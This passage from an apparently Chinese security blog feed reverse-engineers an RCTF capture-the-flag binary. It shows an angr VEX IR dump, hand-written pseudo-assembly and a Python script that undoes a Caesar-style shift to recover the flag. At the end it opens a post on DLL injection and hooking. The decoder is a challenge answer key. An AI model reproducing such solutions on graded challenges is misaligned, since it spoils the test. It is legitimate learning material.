   94 | STle(t90) &#x3D; 0x45
   95 | PUT(eip) &#x3D; 0x080484dc
0x80484dc
   97 | t92 &#x3D; Add32(t58,0xffffffb9)
   98 | STle(t92) &#x3D; 0x46
   99 | PUT(eip) &#x3D; 0x080484e0
0x80484e0
   101 | t94 &#x3D; Add32(t58,0xffffffba)
   102 | STle(t94) &#x3D; 0x47
   103 | PUT(eip) &#x3D; 0x080484e4
0x80484e4
   105 | t96 &#x3D; Add32(t58,0xffffffbb)
   106 | STle(t96) &#x3D; 0x48
   107 | PUT(eip) &#x3D; 0x080484e8
0x80484e8
   109 | t98 &#x3D; Add32(t58,0xffffffbc)
   110 | STle(t98) &#x3D; 0x49
   111 | PUT(eip) &#x3D; 0x080484ec
0x80484ec
   113 | t100 &#x3D; Add32(t58,0xffffffbd)
   114 | STle(t100) &#x3D; 0x4a
   115 | PUT(eip) &#x3D; 0x080484f0
0x80484f0
   117 | t102 &#x3D; Add32(t58,0xffffffbe)
   118 | STle(t102) &#x3D; 0x4b
   119 | PUT(eip) &#x3D; 0x080484f4
0x80484f4
   121 | t104 &#x3D; Add32(t58,0xffffffbf)
   122 | STle(t104) &#x3D; 0x4c
   123 | PUT(eip) &#x3D; 0x080484f8
0x80484f8
   125 | t106 &#x3D; Add32(t58,0xffffffc0)
   126 | STle(t106) &#x3D; 0x4d
   127 | PUT(eip) &#x3D; 0x080484fc
0x80484fc
   129 | t108 &#x3D; Add32(t58,0xffffffc1)
   130 | STle(t108) &#x3D; 0x4e
   131 | PUT(eip) &#x3D; 0x08048500
0x8048500
   133 | t110 &#x3D; Add32(t58,0xffffffc2)
   134 | STle(t110) &#x3D; 0x4f
   135 | PUT(eip) &#x3D; 0x08048504
0x8048504
   137 | t112 &#x3D; Add32(t58,0xffffffc3)
   138 | STle(t112) &#x3D; 0x50
   139 | PUT(eip) &#x3D; 0x08048508
0x8048508
   141 | t114 &#x3D; Add32(t58,0xffffffc4)
   142 | STle(t114) &#x3D; 0x51
   143 | PUT(eip) &#x3D; 0x0804850c
0x804850c
   145 | t116 &#x3D; Add32(t58,0xffffffc5)
   146 | STle(t116) &#x3D; 0x52
   147 | PUT(eip) &#x3D; 0x08048510
0x8048510
   149 | t118 &#x3D; Add32(t58,0xffffffc6)
   150 | STle(t118) &#x3D; 0x53
   151 | PUT(eip) &#x3D; 0x08048514
0x8048514
   153 | t120 &#x3D; Add32(t58,0xffffffc7)
   154 | STle(t120) &#x3D; 0x54
   155 | PUT(eip) &#x3D; 0x08048518
0x8048518
   157 | t122 &#x3D; Add32(t58,0xffffffc8)
   158 | STle(t122) &#x3D; 0x55
   159 | PUT(eip) &#x3D; 0x0804851c
0x804851c
   161 | t124 &#x3D; Add32(t58,0xffffffc9)
   162 | STle(t124) &#x3D; 0x56
   163 | PUT(eip) &#x3D; 0x08048520
0x8048520
   165 | t126 &#x3D; Add32(t58,0xffffffca)
   166 | STle(t126) &#x3D; 0x57
   167 | PUT(eip) &#x3D; 0x08048524
0x8048524
   169 | t128 &#x3D; Add32(t58,0xffffffcb)
   170 | STle(t128) &#x3D; 0x58
   171 | PUT(eip) &#x3D; 0x08048528
0x8048528
   173 | t130 &#x3D; Add32(t58,0xffffffcc)
   174 | STle(t130) &#x3D; 0x59
   175 | PUT(eip) &#x3D; 0x0804852c
0x804852c
   177 | t132 &#x3D; Add32(t58,0xffffffcd)
   178 | STle(t132) &#x3D; 0x5a
   179 | PUT(eip) &#x3D; 0x08048530
0x8048530
   181 | t134 &#x3D; Add32(t58,0xffffffa8)
   182 | STle(t134) &#x3D; 0x00000000
0x8048537
   NEXT: PUT(eip) &#x3D; 0x080485c8; Ijk_Boring
0x804853c
   01 | t14 &#x3D; GET:I32(ebp)
   02 | t13 &#x3D; Add32(t14,0xffffffce)
   03 | PUT(eip) &#x3D; 0x0804853f
0x804853f
   05 | t15 &#x3D; Add32(t14,0xffffffa8)
   06 | t17 &#x3D; LDle:I32(t15)
0x8048542
   08 | t2 &#x3D; Add32(t17,t13)
   09 | PUT(eip) &#x3D; 0x08048544
0x8048544
   11 | t19 &#x3D; LDle:I8(t2)
   12 | t32 &#x3D; 8Uto32(t19)
   13 | t18 &#x3D; t32
   14 | PUT(eax) &#x3D; t18
0x8048547
   16 | t21 &#x3D; GET:I8(al)
   17 | t33 &#x3D; 8Sto32(t21)
   18 | t20 &#x3D; t33
   19 | PUT(edx) &#x3D; t20
   20 | PUT(eip) &#x3D; 0x0804854a
0x804854a
   22 | t22 &#x3D; Add32(t14,0xffffffac)
   23 | t24 &#x3D; LDle:I32(t22)
0x804854d
   25 | t7 &#x3D; Add32(t24,t20)
   26 | PUT(eax) &#x3D; t7
0x804854f
   28 | PUT(cc_op) &#x3D; 0x00000006
   29 | PUT(cc_dep1) &#x3D; t7
   30 | PUT(cc_dep2) &#x3D; 0x0000005a
   31 | PUT(cc_ndep) &#x3D; 0x00000000
   32 | PUT(eip) &#x3D; 0x08048552
0x8048552
   34 | t35 &#x3D; CmpLE32S(t7,0x0000005a)
   35 | t34 &#x3D; 1Uto32(t35)
   36 | t30 &#x3D; t34
   37 | t36 &#x3D; 32to1(t30)
   38 | t25 &#x3D; t36
   39 | if (t25) &#123; PUT(eip) &#x3D; 0x8048554; Ijk_Boring &#125;
   NEXT: PUT(eip) &#x3D; 0x08048574; Ijk_Boring
0x8048554
   01 | t17 &#x3D; GET:I32(ebp)
   02 | t16 &#x3D; Add32(t17,0xffffffce)
   03 | PUT(eip) &#x3D; 0x08048557
0x8048557
   05 | t18 &#x3D; Add32(t17,0xffffffa8)
   06 | t20 &#x3D; LDle:I32(t18)
0x804855a
   08 | t2 &#x3D; Add32(t20,t16)
   09 | PUT(eip) &#x3D; 0x0804855c
0x804855c
   11 | t22 &#x3D; LDle:I8(t2)
   12 | t21 &#x3D; 8Uto32(t22)
0x804855f
   14 | PUT(eip) &#x3D; 0x08048561
0x8048561
   16 | t24 &#x3D; Add32(t17,0xffffffac)
   17 | t26 &#x3D; LDle:I32(t24)
0x8048564
   19 | t7 &#x3D; Add32(t26,t21)
0x8048566
   21 | PUT(ecx) &#x3D; t7
0x8048568
   23 | t28 &#x3D; Add32(t17,0xffffffce)
   24 | PUT(edx) &#x3D; t28
   25 | PUT(eip) &#x3D; 0x0804856b
0x804856b
   27 | t30 &#x3D; Add32(t17,0xffffffa8)
   28 | t32 &#x3D; LDle:I32(t30)
0x804856e
   30 | t12 &#x3D; Add32(t32,t28)
   31 | PUT(cc_op) &#x3D; 0x00000003
   32 | PUT(cc_dep1) &#x3D; t32
   33 | PUT(cc_dep2) &#x3D; t28
   34 | PUT(cc_ndep) &#x3D; 0x00000000
   35 | PUT(eax) &#x3D; t12
   36 | PUT(eip) &#x3D; 0x08048570
0x8048570
   38 | t33 &#x3D; GET:I8(cl)
   39 | STle(t12) &#x3D; t33
0x8048572
   NEXT: PUT(eip) &#x3D; 0x080485c4; Ijk_Boring
0x8048574
   01 | t63 &#x3D; GET:I32(ebp)
   02 | t62 &#x3D; Add32(t63,0xffffffce)
   03 | PUT(eip) &#x3D; 0x08048577
0x8048577
   05 | t64 &#x3D; Add32(t63,0xffffffa8)
   06 | t66 &#x3D; LDle:I32(t64)
0x804857a
   08 | t2 &#x3D; Add32(t66,t62)
   09 | PUT(eip) &#x3D; 0x0804857c
0x804857c
   11 | t68 &#x3D; LDle:I8(t2)
   12 | t140 &#x3D; 8Uto32(t68)
   13 | t67 &#x3D; t140
   14 | PUT(eax) &#x3D; t67
0x804857f
   16 | t70 &#x3D; GET:I8(al)
   17 | t141 &#x3D; 8Sto32(t70)
   18 | t69 &#x3D; t141
   19 | PUT(eip) &#x3D; 0x08048582
0x8048582
   21 | t71 &#x3D; Add32(t63,0xffffffac)
   22 | t73 &#x3D; LDle:I32(t71)
0x8048585
   24 | t7 &#x3D; Add32(t73,t69)
0x8048587
   26 | t74 &#x3D; Add32(t7,0xffffffa6)
0x804858a
0x804858f
0x8048591
   30 | t14 &#x3D; MullS32(t74,0x4ec4ec4f)
   31 | t142 &#x3D; 64HIto32(t14)
   32 | t77 &#x3D; t142
0x8048593
   34 | t20 &#x3D; Sar32(t77,0x03)
0x8048596
0x8048598
   37 | t27 &#x3D; Sar32(t74,0x1f)
0x804859b
   39 | t31 &#x3D; Sub32(t20,t27)
0x804859d
   41 | PUT(eip) &#x3D; 0x0804859f
0x804859f
   43 | t103 &#x3D; Add32(t63,0xffffffb0)
   44 | STle(t103) &#x3D; t31
   45 | PUT(eip) &#x3D; 0x080485a2
0x80485a2
   47 | t106 &#x3D; Add32(t63,0xffffffb0)
   48 | t108 &#x3D; LDle:I32(t106)
0x80485a5
   50 | t38 &#x3D; Mul32(t108,0x0000001a)
0x80485a8
   52 | t39 &#x3D; Sub32(t74,t38)
0x80485aa
   54 | PUT(eip) &#x3D; 0x080485ac
0x80485ac
   56 | t110 &#x3D; Add32(t63,0xffffffb0)
   57 | STle(t110) &#x3D; t39
   58 | PUT(eip) &#x3D; 0x080485af
0x80485af
   60 | t113 &#x3D; Add32(t63,0xffffffb0)
   61 | t115 &#x3D; LDle:I32(t113)
0x80485b2
   63 | t44 &#x3D; Sub32(t115,0x00000001)
   64 | PUT(eip) &#x3D; 0x080485b5
0x80485b5
   66 | t117 &#x3D; Add32(t63,t44)
   67 | t116 &#x3D; Add32(t117,0xffffffb4)
   68 | t122 &#x3D; LDle:I8(t116)
   69 | t143 &#x3D; 8Uto32(t122)
   70 | t121 &#x3D; t143
   71 | PUT(eax) &#x3D; t121
0x80485ba
   73 | t123 &#x3D; Add32(t63,0xffffffce)
   74 | PUT(ecx) &#x3D; t123
   75 | PUT(eip) &#x3D; 0x080485bd
0x80485bd
   77 | t125 &#x3D; Add32(t63,0xffffffa8)
   78 | t127 &#x3D; LDle:I32(t125)
0x80485c0
   80 | t50 &#x3D; Add32(t127,t123)
   81 | PUT(edx) &#x3D; t50
   82 | PUT(eip) &#x3D; 0x080485c2
0x80485c2
   84 | t128 &#x3D; GET:I8(al)
   85 | STle(t50) &#x3D; t128
   86 | PUT(eip) &#x3D; 0x080485c4
0x80485c4
   88 | t129 &#x3D; Add32(t63,0xffffffa8)
   89 | t56 &#x3D; LDle:I32(t129)
   90 | t54 &#x3D; Add32(t56,0x00000001)
   91 | STle(t129) &#x3D; t54
   92 | PUT(eip) &#x3D; 0x080485c8

0x80485c8
   01 | t5 &#x3D; GET:I32(ebp)
   02 | t4 &#x3D; Add32(t5,0xffffffa8)
   03 | t2 &#x3D; LDle:I32(t4)           #A load from memory
   04 | PUT(cc_op) &#x3D; 0x00000006
   05 | PUT(cc_dep1) &#x3D; t2
   06 | PUT(cc_dep2) &#x3D; 0x00000024
   07 | PUT(cc_ndep) &#x3D; 0x00000000
   08 | PUT(eip) &#x3D; 0x080485cc
0x80485cc
   10 | t14 &#x3D; CmpLE32S(t2,0x00000024)
   11 | t13 &#x3D; 1Uto32(t14)
   12 | t11 &#x3D; t13
   13 | t15 &#x3D; 32to1(t11)
   14 | t6 &#x3D; t15
   15 | if (t6) &#123; PUT(eip) &#x3D; 0x804853c; Ijk_Boring &#125;
   NEXT: PUT(eip) &#x3D; 0x080485d2; Ijk_Boring
0x80485d2
   01 | PUT(eax) &#x3D; 0x00000000
   02 | PUT(eip) &#x3D; 0x080485d7
0x80485d7
   04 | t10 &#x3D; GET:I32(ebp)
   05 | t9 &#x3D; Add32(t10,0xfffffff4)
   06 | t11 &#x3D; LDle:I32(t9)
   07 | PUT(ecx) &#x3D; t11
   08 | PUT(eip) &#x3D; 0x080485da
0x80485da
   10 | t13 &#x3D; GET:I16(gs)
   11 | t25 &#x3D; 16Uto32(t13)
   12 | t12 &#x3D; t25
   13 | t5 &#x3D; GET:I64(ldt)
   14 | t6 &#x3D; GET:I64(gdt)
   15 | t26 &#x3D; x86g_use_seg_selector(t5,t6,t12,0x00000014):Ity_I64
   16 | t14 &#x3D; t26
   17 | t27 &#x3D; 64HIto32(t14)
   18 | t16 &#x3D; t27
   19 | t15 &#x3D; CmpNE32(t16,0x00000000)
   20 | if (t15) &#123; PUT(eip) &#x3D; 0x80485da; Ijk_MapFail &#125;
   21 | t28 &#x3D; 64to32(t14)
   22 | t17 &#x3D; t28
   23 | t2 &#x3D; LDle:I32(t17)
   24 | t1 &#x3D; Xor32(t11,t2)
   25 | PUT(cc_op) &#x3D; 0x0000000f
   26 | PUT(cc_dep1) &#x3D; t1
   27 | PUT(cc_dep2) &#x3D; 0x00000000
   28 | PUT(cc_ndep) &#x3D; 0x00000000
   29 | PUT(ecx) &#x3D; t1
   30 | PUT(eip) &#x3D; 0x080485e1
0x80485e1
   32 | t30 &#x3D; CmpEQ32(t1,0x00000000)
   33 | t29 &#x3D; 1Uto32(t30)
   34 | t23 &#x3D; t29
   35 | t31 &#x3D; 32to1(t23)
   36 | t18 &#x3D; t31
   37 | if (t18) &#123; PUT(eip) &#x3D; 0x80485e8; Ijk_Boring &#125;
   NEXT: PUT(eip) &#x3D; 0x080485e3; Ijk_Boring
0x80485e8
   01 | t2 &#x3D; GET:I32(esp)
   02 | t0 &#x3D; Add32(t2,0x00000054)
   03 | PUT(cc_op) &#x3D; 0x00000003
   04 | PUT(cc_dep1) &#x3D; t2
   05 | PUT(cc_dep2) &#x3D; 0x00000054
   06 | PUT(cc_ndep) &#x3D; 0x00000000
   07 | PUT(esp) &#x3D; t0
   08 | PUT(eip) &#x3D; 0x080485eb
0x80485eb
   10 | t3 &#x3D; LDle:I32(t0)
   11 | t10 &#x3D; Add32(t0,0x00000004)
   12 | PUT(esp) &#x3D; t10
   13 | PUT(ecx) &#x3D; t3
   14 | PUT(eip) &#x3D; 0x080485ec
0x80485ec
   16 | t5 &#x3D; LDle:I32(t10)
   17 | PUT(ebp) &#x3D; t5
0x80485ed
   19 | t12 &#x3D; Add32(t3,0xfffffffc)
   20 | PUT(esp) &#x3D; t12
   21 | PUT(eip) &#x3D; 0x080485f0
0x80485f0
   23 | t9 &#x3D; LDle:I32(t12)
   24 | t14 &#x3D; Add32(t12,0x00000004)
   25 | PUT(esp) &#x3D; t14
   NEXT: PUT(eip) &#x3D; t9; Ijk_Ret
0x80485f1
   01 | t0 &#x3D; GET:I32(esp)
   02 | t3 &#x3D; LDle:I32(t0)
   03 | PUT(eax) &#x3D; t3
   04 | PUT(eip) &#x3D; 0x080485f4
0x80485f4
   06 | t2 &#x3D; LDle:I32(t0)
   07 | t4 &#x3D; Add32(t0,0x00000004)
   08 | PUT(esp) &#x3D; t4
   NEXT: PUT(eip) &#x3D; t2; Ijk_Ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="我们可以根据语义，去分析每一段block做了什么，跳转到哪里。"><a href="#我们可以根据语义，去分析每一段block做了什么，跳转到哪里。" class="headerlink" title="我们可以根据语义，去分析每一段block做了什么，跳转到哪里。"></a>我们可以根据语义，去分析每一段block做了什么，跳转到哪里。</h3><p>当然，我们也可以倒过来写汇编，毕竟就只有 110 行左右的汇编。</p>
<p>说到底，其实我们就是人工做了语法分析的逻辑。<br>以下是我写的伪代码。浓缩到110行了。直接看 irsb 也是可以的，甚至我这种人肉反汇编其实是比较浪费时间的。</p>
<pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">0x8048464   sub esp,0x58
0x8048467   mov [esp],0x0804846c -&gt; call 0x804846c # 写地址 CALL
0x804846c   add eax,0x1b94
0x8048471   
0x8048477   mov [ebp-0x0C],[x86g_use_seg_selector(t5,t6,t50,0x00000014)]
0x804847a   mov eax,0
0x804847c   mov.d [ebp-0x32],0x656d3174
0x8048483   mov.d [ebp-0x2E],0x7530795f
0x804848a   mov.d [ebp-0x2A],0x6a6e655f
...
0x80484b4   mov.d [ebp-0x12],0x65743561
0x80484bb   mov.w [ebp-0x0E],0x0064
0x80484c1   mov.d [ebp-0x54],0x00000003
0x80484c8   mov.b [ebp-0x4C],0x41
0x80484cc   mov.b [ebp-0x4B],0x42
...
0x804852c   mov.b [ebp-0x33],0x5a
0x8048530   mov.d [ebp-0x58],0x00000000
0x8048537   jmp 0x80485c8-----------------------------|


0x804853c   lea edx,[ebp-0x32]&lt;-------|   # add a2,[ebp-0x58],ebp-0x32
0x804853f   mov.d eax,[ebp-0x58]
0x8048542   add eax,edx
0x8048544   mov.b eax,[eax]
0x8048547   mov edx,al                  # get a byte
0x804854a   mov eax,[ebp-0x54]          # 所有的都会位移3
0x804854d   add eax,edx
0x804854f   cmp eax,0x0000005a
0x8048552   jle 0x8048554---------------| jmp  0x8048574            

0x8048554   lea edx,[ebp-0x32]                            
0x8048557   mov eax,[ebp-0x58]
0x804855a   add edx,eax
0x804855c   mov.bb al,[edx]
0x804855f                               #位移3
0x8048561   mov t26,[ebp-0x54]
0x8048564   add t7,t26,eax
0x8048566   mov ecx,t7
0x8048568   lea edx,[ebp-0x32]
0x804856b   
0x804856e   mov eax,(edx+[ebp-0x58])
0x8048570   mov [eax],cl
0x8048572   jmp 0x80485c4

                                        |
                                        |
0x8048574   lea edx,[ebp-0x32]&lt;---------|
0x8048577   mov ecx,[ebp-0x58]
0x804857a   add ecx,edx
0x804857c   mov.b ecx,[ecx]
0x804857f   mov edx,al                  #(al+3-0x5A)*0x4ec4ec4f&gt;&gt;3
0x8048582   mov ecx,[ebp-0x54]
0x8048585   add ecx,edx
0x8048587   sub ecx,0x5A
0x8048591   mul 0x4ec4ec4f              # ecx &#x3D; (I32high)(rcx*0x4ec4ec4f)
0x8048593   shr ecx,0x3
0x8048596   mov edx,[ebp-0x54]
0x8048598   shr edx,0x1f
0x804859b   sub edx,eax
0x804859d   jmp 0x0804859f              
0x804859f   [ebp-0x50],edx
0x80485a2   mov eax,[ebp-0x50]          #eax&#x3D;eax*0x0000001a
0x80485a5   mul 0x0000001a
0x80485a8   sub ecx,eax
0x80485aa   nop
0x80485ac   mov [ebp-0x50],ecx
0x80485af   mov ecx,[ebp-0x50]
0x80485b2   sub ecx,0x00000001
0x80485b5   mov.b eax,[ebp+ecx-0x4C]  # 根据 ecx 查表
0x80485ba   lea ecx,[ebp-0x32]
0x80485bd   mov t127,[ebp-0x58]
0x80485c0   mov edx,t127+ecx
0x80485c2   mov.b [edx],eax
0x80485c4   add [ebp-0x58],0x1---------|
0x80485c8   cmp [ebp-0x58],0x24------------|    |
0x80485cc   jnz 0x804853c ----------------------|

0x80485d2   mov eax,0x0
0x80485d7   mov ecx,[ebp-0x0C]
0x80485da   xor ecx,[x86g_use_seg_selector(t5,t6,t12,0x00000014)]
0x80485e1   cmp ecx,0x00;   je 0x80485e8;jmp out
0x80485e8   add esp,0x54
0x80485eb   mov ecx,[esp] ; add esp,0x04
0x80485ec   mov ebp,[esp]
0x80485ed   
0x80485f0   ret
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>了解到栈里面不同位置干什么用了之后，可以看到程序的逻辑就是位移以及一段取模</p>
<p>解密脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">byte_stream <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span>
                <span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span>
                <span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span>
                <span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span>
                <span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span>
                <span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span>
                <span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span>
                <span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span>
                <span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span>
                <span class="token number">0x64</span><span class="token punctuation">]</span>
<span class="token comment"># table = [0x41...0x5a]</span>
table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x41</span> <span class="token operator">+</span> num <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token operator">-</span><span class="token number">0x41</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i<span class="token punctuation">,</span>value <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>byte_stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> value <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">&lt;=</span> <span class="token number">0x0000005a</span><span class="token punctuation">:</span>
        byte_stream<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> value <span class="token operator">+</span> <span class="token number">3</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        t74 <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">+</span> value <span class="token operator">-</span> <span class="token number">0x5a</span>
        mul1 <span class="token operator">=</span> <span class="token punctuation">(</span>t74 <span class="token operator">*</span> <span class="token number">0x4ec4ec4f</span><span class="token punctuation">)</span> <span class="token operator">>></span><span class="token number">32</span>
        t20 <span class="token operator">=</span> mul1 <span class="token operator">>></span> <span class="token number">3</span>
        t27 <span class="token operator">=</span> <span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">-</span><span class="token number">0x5A</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">0x1f</span>
        mul2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>t20 <span class="token operator">-</span> t27<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x1a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span>
        sub <span class="token operator">=</span> value <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">0x5A</span> <span class="token operator">-</span> mul2
        byte_stream<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> table<span class="token punctuation">[</span>sub<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>byte_stream<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># t20 = Sar32(from64HIto32(MullS32(from8to32(ch) + 0x00000003 - 0x5A,0x4ec4ec4f)),0x03)</span>
<span class="token comment"># t27 = Sar32(from8to32(ch) + 0x00000003 - 0x5A,0x1f)</span>
<span class="token comment"># load_ch(ebp + Sub32(from8to32(ch) + 0x00000003 - 0x5A,Mul32(Sub32(t20,t27),0x0000001a)) - 0x00000001 - 0x4C)</span>

<span class="token comment"># 2**35 / 0x4ec4ec4f = 25L</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>符号执行</category>
        <category>Angr</category>
        <category>RCTF</category>
      </categories>
      <tags>
        <tag>符号执行</tag>
        <tag>angr</tag>
        <tag>留坑</tag>
        <tag>WP</tag>
        <tag>RCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dll INJECTION &amp;&amp; HOOK</title>
    <url>/2021/05/22/dll_injection_hook/</url>
    <content><![CDATA[<h1 id="DLL-INJECTION-amp-amp-HOOK"><a href="#DLL-INJECTION-amp-amp-HOOK" class="headerlink" title="DLL INJECTION &amp;&amp; HOOK"></a>DLL INJECTION &amp;&amp; HOOK</h1><blockquote>
<p>《关于我一本书看到一半却咕了一个学期这件事》</p>
</blockquote>
<p>粗略的看了一下，dll injection 和 hook 发现这俩应该是得放一起的，因为涉及的知识比较难做分隔，或者说基础知识很是接近，越是了解，就会发现越要了解 windows 的 loader 机制，windows 的一些较为有用的 api ，甚至是 windows 的内核数据结构，直接深入 windows 的 r0 还是比较猛的。</p>
